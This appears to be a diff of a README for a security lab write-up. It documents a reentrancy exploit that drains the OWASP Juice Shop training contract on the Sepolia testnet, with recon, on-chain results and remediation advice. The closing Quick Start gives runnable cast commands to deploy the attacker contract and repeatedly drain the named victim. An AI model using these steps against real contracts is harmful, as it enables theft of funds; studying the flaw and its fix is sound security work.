@@ -9,12 +9,13 @@ Reentrancy exploit against the [OWASP Juice Shop](https://owasp.org/www-project-
 
 ## Table of Contents
 1. [Methodology](#1-methodology)
-2. [Exploit Design](#2-exploit-design)
-3. [V2 — Improved Contract & Extended Exploits](#3-v2--improved-contract--extended-exploits)
-4. [Business Impact](#4-business-impact)
-5. [Remediation](#5-remediation)
-6. [Evidence & Aftermath](#6-evidence--aftermath)
-7. [Project Structure & Usage](#7-project-structure--usage)
+2. [Exploit Design (v1 — Original)](#2-exploit-design-v1--original)
+3. [Exploit Design (v2 — Improved)](#3-exploit-design-v2--improved)
+4. [On-Chain Execution](#4-on-chain-execution)
+5. [Business Impact](#5-business-impact)
+6. [Remediation](#6-remediation)
+7. [Evidence & Aftermath](#7-evidence--aftermath)
+8. [Project Structure & Usage](#8-project-structure--usage)
 
 ---
 
@@ -23,6 +24,11 @@ Reentrancy exploit against the [OWASP Juice Shop](https://owasp.org/www-project-
 1. **Recon / enumeration**
    - Figured out our point of entry would be the new web 3 wallet accessible from ![Wallet](/WD/WD-0.png) ![1](/WD/WD-1.png)
    - **Target :** Juice Shop Sepolia testnet smart contract (victim) found in the source code : `0x413744D59d31AFDC2889aeE602636177805Bd7b0`.
+
+2. **Bytecode analysis**
+   - Decompiled the victim's on-chain bytecode to extract function selectors.
+   - Discovered the deposit function is **`ethdeposit(address)`** (selector `0x22c33cb3`), not the standard `deposit(address)` (`0xf340fa01`).
+   - Withdraw function is the standard **`withdraw(uint256)`** (selector `0x2e1a7d4d`).
 
 ---
 
@@ -46,91 +52,72 @@ function withdraw(uint256 _amount) {
 }
 ```
 
+**Vulnerability:** The victim violates the **Checks-Effects-Interactions** pattern. It sends ETH via an external call (step 3) **before** updating the caller's balance (step 4). The reentrancy guard (`unknownac7ea680`) is useless because it increments before the call but resets after — during reentry, the function never reaches the reset line.
+
+**Severity:** Critical — possible drain of all funds held by the contract.
+
 ---
 
-## 2) Exploit Design
-
-### Original Attack (v1)
+## 2) Exploit Design (v1 — Original)
 
 [Wrote and deployed a contract on the Sepolia ETH testnet to exploit a reentrancy vulnerability within the juice shop contract.](https://github.com/Keuchnotkush/Juice-Shop-Wallet-Depletion/blob/main/attack.sol)
 
 #### How It Works
 
-1. **Deposit ETH**
-   - Calls the victim's `deposit` function to establish a balance for the attack.
+1. **Deposit ETH** — Calls the victim's `ethdeposit` function to establish a balance for the attack.
+2. **Trigger Withdrawal** — Calls the victim's `withdraw` function to start the exploit.
+3. **Re-enter Withdrawal** — The `fallback` function is triggered during the victim's ETH transfer. It recursively calls `withdraw` before the victim updates the balance, draining funds.
+4. **Withdraw Stolen ETH** — Sends the stolen ETH to the attacker's wallet.
 
-2. **Trigger Withdrawal**
-   - Calls the victim's `withdraw` function to start the exploit.
+#### v1 Execution
+- Deposited `0.1 ETH` into the victim.
+- Triggered `exploit(1000000000000000000 WEI)` and re-entered 13 times to drain `2.5 ETH`.
+- Verified on Sepolia block explorer. Challenge endpoint responded `200 OK`.
 
-3. **Re-enter Withdrawal**
-   - The `fallback` function is triggered during the victim's ETH transfer.
-   - It recursively calls `withdraw` before the victim updates my balance, draining its funds.
-
-4. **Withdraw Stolen ETH**
-   - Finally, sends the stolen ETH to my wallet.
-
-#### Victim's Flaw
-
-The victim contract violates the **Checks-Effects-Interactions** pattern by:
-- Sending ETH **before** updating the balance.
-- Using an ineffective reentrancy guard (`unknownac7ea680`) that resets too late.
-
-This makes it vulnerable to reentrancy attacks.
-
-#### Vulnerability Severity
-- **Critical** : Possible drain of all funds of the target contract.
-
----
-
-#### Exploit Execution
-- Deposited `0.1 ETH` into the victim (to initialize attacker balance in the victim's mapping).
-- Triggered `exploit(1000000000000000000 WEI)` and re-entered 13 times to drain a total of `2.5 ETH`.
-
-#### Validation
-- Verified attacker contract balance and transaction outcomes on Sepolia block explorer.
-- Confirmed that on the platform instance the challenge endpoint responded `200 OK`.
-
-### Techniques Used
-- Smart-contract recon & bytecode/decompiler review
-- Reentrancy exploitation (recursive external calls via fallback/receive)
-- Transaction verification & basic on-chain forensics (balances, blocks, tx hash)
-
-### Tools Used
+#### v1 Tools
 - **Remix IDE** (compile/deploy/call contracts)
 - **Phantom** (Web3 wallet & signing)
 - **Sepolia testnet faucet** (funding)
 - **Etherscan (Sepolia)** (transaction & contract inspection)
 - **Browser DevTools** (platform API observation)
 
+#### v1 Outcome
+| Metric | Value |
+|--------|-------|
+| Initial deposit | `0.1 ETH` |
+| Total withdrawn | `2.6 ETH` |
+| Net gain | `2.5 ETH` (**2400%** ROI) |
+
 ---
 
-## 3) V2 — Improved Contract & Extended Exploits
+## 3) Exploit Design (v2 — Improved)
 
-The original `attack.sol` was rewritten with bug fixes, a proper Foundry framework, full test coverage, and an extended multi-contract attack vector.
+The original `attack.sol` was rewritten from scratch with bug fixes, a typed interface, event-based forensics, a Foundry test suite, and an extended multi-contract attack vector.
 
-### Bugs Fixed
+### Bugs Fixed from v1
 
-| # | Issue | Before | After |
-|---|-------|--------|-------|
+| # | Issue | v1 | v2 |
+|---|-------|-----|-----|
 | 1 | Reentry depth | `attackCount < 2` — only 1 reentry | Balance-based + gas-guarded termination — drains until victim is empty |
 | 2 | Amount mismatch | `fallback()` hardcoded `0.1 ether`, `exploit(amount)` used a different value | `withdrawAmount` stored in state, used by both `exploit()` and `_reenter()` |
 | 3 | ETH forwarding | `transfer()` with 2300 gas stipend | `.call{value:}("")` — no gas limit |
 | 4 | Raw selectors | Magic numbers `0x2e1a7d4d`, `0x22c33cb3` | `IVictim` interface with typed calls |
-| 5 | No observability | Silent execution | Events: `Deposited`, `ExploitStarted`, `Reentry`, `ExploitCompleted`, `Withdrawn` |
-| 6 | Hardcoded victim | No reconfiguration | `setVictim()` with owner guard |
-| 7 | `receive()` vs `fallback()` | Only `fallback()` — missed empty-calldata ETH transfers | Both `receive()` and `fallback()` route to `_reenter()` |
+| 5 | Wrong function name | Used `deposit(address)` — wrong selector | Corrected to `ethdeposit(address)` after bytecode analysis |
+| 6 | No observability | Silent execution | Events: `Deposited`, `ExploitStarted`, `Reentry`, `ExploitCompleted`, `Withdrawn` |
+| 7 | Hardcoded victim | No reconfiguration after deployment | `setVictim()` with owner guard |
+| 8 | `receive()` vs `fallback()` | Only `fallback()` — missed empty-calldata ETH transfers | Both `receive()` and `fallback()` route to `_reenter()` |
 
-### Improved Attack Flow
+### v2 Attack Flow
 
 ```
 depositToVictim()          exploit(amount)                     withdraw()
       │                         │                                  │
       ▼                         ▼                                  ▼
  ┌─────────┐             ┌─────────────┐                    ┌───────────┐
- │ Deposit  │             │  withdraw() │◄──┐               │ Send ETH  │
- │ into     │             │  on victim  │   │               │ to owner  │
- │ victim   │             └──────┬──────┘   │               │ EOA       │
- └─────────┘                     │          │               └───────────┘
+ │ ethdeposit│            │  withdraw() │◄──┐               │ Send ETH  │
+ │ into      │            │  on victim  │   │               │ to owner  │
+ │ victim    │            └──────┬──────┘   │               │ EOA       │
+ └──────────┘                    │          │               └───────────┘
                           victim sends ETH  │
                                  │          │
                           ┌──────▼──────┐   │
@@ -162,7 +149,7 @@ AttackerFactory
       └── withdraw()                 ──▶  send to owner EOA
 ```
 
-### Test Results
+### Test Results (14/14 passing)
 
 ```
 forge test -vv
@@ -191,7 +178,61 @@ Ran 14 tests for test/Attacker.t.sol
 
 ---
 
-## 4) Business Impact
+## 4) On-Chain Execution
+
+### v1 — Original exploit (Remix IDE)
+
+| | Address |
+|---|---|
+| Attacker (v1) | [`0x1F0db224880Dcd7dAc8fedB0fb01Be9041bF7929`](https://sepolia.etherscan.io/address/0x1F0db224880Dcd7dAc8fedB0fb01Be9041bF7929) |
+| Victim | [`0x413744D59d31AFDC2889aeE602636177805Bd7b0`](https://sepolia.etherscan.io/address/0x413744D59d31AFDC2889aeE602636177805Bd7b0) |
+
+| Metric | Value |
+|--------|-------|
+| Deposit | 0.1 ETH |
+| Drained | 2.6 ETH |
+| Net gain | 2.5 ETH (2400% ROI) |
+
+### v2 — Improved exploit (Foundry + cast)
+
+| | Address |
+|---|---|
+| Attacker (v2) | [`0x44642a44Ab72E91eFc9c829a19c4bB0C9b63e44c`](https://sepolia.etherscan.io/address/0x44642a44Ab72E91eFc9c829a19c4bB0C9b63e44c) |
+| Victim | [`0x413744D59d31AFDC2889aeE602636177805Bd7b0`](https://sepolia.etherscan.io/address/0x413744D59d31AFDC2889aeE602636177805Bd7b0) |
+
+**Key transactions:**
+
+| Step | Tx Hash | Description |
+|------|---------|-------------|
+| Deploy | [`0xf5a3e342...`](https://sepolia.etherscan.io/tx/0xf5a3e3423f6f0ffe7ba27c74d46903d3b5a2bc47e2ca7023727f6d1fa9d9e156) | Deploy v2 Attacker contract |
+| Deposit | [`0xecf57c49...`](https://sepolia.etherscan.io/tx/0xecf57c49002904dca29290a933c26fd68f6d3e6c9c0fcf6d380b000000f89fd4) | Deposit 0.1 ETH into victim |
+| Exploit (1st) | [`0x73b05f3e...`](https://sepolia.etherscan.io/tx/0x73b05f3e31f5f12077d223824dedeaa4ff0b6df8b47a66a9e31f5a5caf302f36) | First reentrant drain (0.2 ETH) |
+| Withdraw | [`0xe9558feb...`](https://sepolia.etherscan.io/tx/0xe9558feb74a8997be494daccec4ab3c967da9e08fa32e620e61800ce909714eb) | Withdraw 6.4 ETH to wallet |
+
+**Execution details:**
+
+The v2 exploit drained the victim across **~30 sequential transactions**, each performing **2 reentries** (0.2 ETH per tx). The victim's on-chain gas forwarding behavior limits recursion depth to ~2 levels per call, unlike the local MockVictim which allows full-depth drain in a single tx.
+
+| Metric | Value |
+|--------|-------|
+| Deposit | 0.1 ETH |
+| Exploit transactions | ~30 |
+| Reentries per tx | 2 |
+| Total drained | **6.4 ETH** |
+| Gas spent | ~0.104 ETH |
+| **Net gain** | **~6.3 ETH** |
+| Victim remaining | 0.00026 ETH (dust, below 0.1 ETH threshold) |
+
+### Final Balances
+
+| | Before | After |
+|---|--------|-------|
+| Victim contract | 6.3 ETH | 0.00026 ETH |
+| Attacker wallet | 0.998 ETH | **7.294 ETH** |
+
+---
+
+## 5) Business Impact
 
 - **Permanent financial loss:** immediate theft of wallet/treasury funds (can drain contract balance quickly).
 - **Service disruption:** contract becomes insolvent; legitimate users can't withdraw.
@@ -200,7 +241,7 @@ Ran 14 tests for test/Attacker.t.sol
 
 ---
 
-## 5) Remediation
+## 6) Remediation
 
 ### Fixes
 - Apply **Checks-Effects-Interactions**: update balances **before** any external call.
@@ -215,34 +256,38 @@ Ran 14 tests for test/Attacker.t.sol
 
 ---
 
-## 6) Evidence & Aftermath
-![2](/WD/WD-2.png)
-![3](/WD/WD-3.png)
-![4](/WD/WD-4.png)
-![5](/WD/WD-5.png)
-![6](/WD/WD-6.png)
-![7](/WD/WD-7.png)
 
-- Everything can be found on-chain at : `0x1F0db224880Dcd7dAc8fedB0fb01Be9041bF7929`
+### Techniques Used
+- Smart-contract recon & bytecode/decompiler review
+- Function selector extraction (`ethdeposit(address)` = `0x22c33cb3`)
+- Reentrancy exploitation (recursive external calls via receive/fallback)
+- Transaction verification & on-chain forensics (balances, blocks, tx hash, event logs)
+- Iterative multi-transaction drain strategy
 
-### Outcome Summary
-- Initial deposit: `0.1 ETH`
-- Total withdrawn: `2.6 ETH`
-- Net gain: `2.5 ETH` (**2400%** over deposit)
+### Tools Used
+
+| Tool | Purpose |
+|------|---------|
+| **Foundry** (forge, cast) | Compile, test, deploy, and interact with contracts |
+| **Remix IDE** | v1 compilation and deployment |
+| **Phantom** | Web3 wallet & transaction signing |
+| **Sepolia testnet faucet** | Funding |
+| **Etherscan (Sepolia)** | Transaction & contract inspection |
+| **Browser DevTools** | Platform API observation |
 
 ---
 
-## 7) Project Structure & Usage
+## 8) Project Structure & Usage
 
 ```
 ├── src/
-│   ├── Attacker.sol              # Improved reentrancy exploit contract
+│   ├── Attacker.sol              # v2 reentrancy exploit contract
 │   ├── AttackerFactory.sol       # Multi-clone attack (defeats per-address guards)
 │   └── interfaces/
-│       └── IVictim.sol           # Typed interface for the victim contract
+│       └── IVictim.sol           # Typed interface (ethdeposit + withdraw)
 │
 ├── test/
-│   ├── Attacker.t.sol            # 14 Foundry tests (drain, access control, events, factory)
+│   ├── Attacker.t.sol            # 14 Foundry tests
 │   └── mocks/
 │       └── MockVictim.sol        # Local replica of the vulnerable contract
 │
@@ -259,7 +304,7 @@ Ran 14 tests for test/Attacker.t.sol
 ### Quick Start
 
 ```bash
-# Install Foundry (if needed)
+# Install Foundry
 curl -L https://foundry.paradigm.xyz | bash && foundryup
 
 # Build
@@ -269,13 +314,23 @@ forge build
 forge test -vvvv
 
 # Deploy to Sepolia
-cp .env.example .env  # fill in your keys
+cp .env.example .env   # fill in SEPOLIA_RPC_URL and PRIVATE_KEY
 source .env
-forge script script/Deploy.s.sol --rpc-url sepolia --broadcast
+VICTIM=0x413744D59d31AFDC2889aeE602636177805Bd7b0
+cast send --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY \
+  --create "$(forge inspect src/Attacker.sol:Attacker bytecode)$(cast abi-encode 'constructor(address)' $VICTIM | cut -c3-)"
 
-# Execute the exploit
-forge script script/Exploit.s.sol --rpc-url sepolia --broadcast \
-  --sig "run(address)" <ATTACKER_ADDRESS>
+# Deposit into victim
+cast send --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY \
+  --value 0.1ether $ATTACKER "depositToVictim()"
+
+# Exploit (repeat until victim is drained)
+cast send --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY \
+  --gas-limit 5000000 $ATTACKER "exploit(uint256)" 100000000000000000
+
+# Withdraw to your wallet
+cast send --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY \
+  $ATTACKER "withdraw()"
 ```
 
 ---
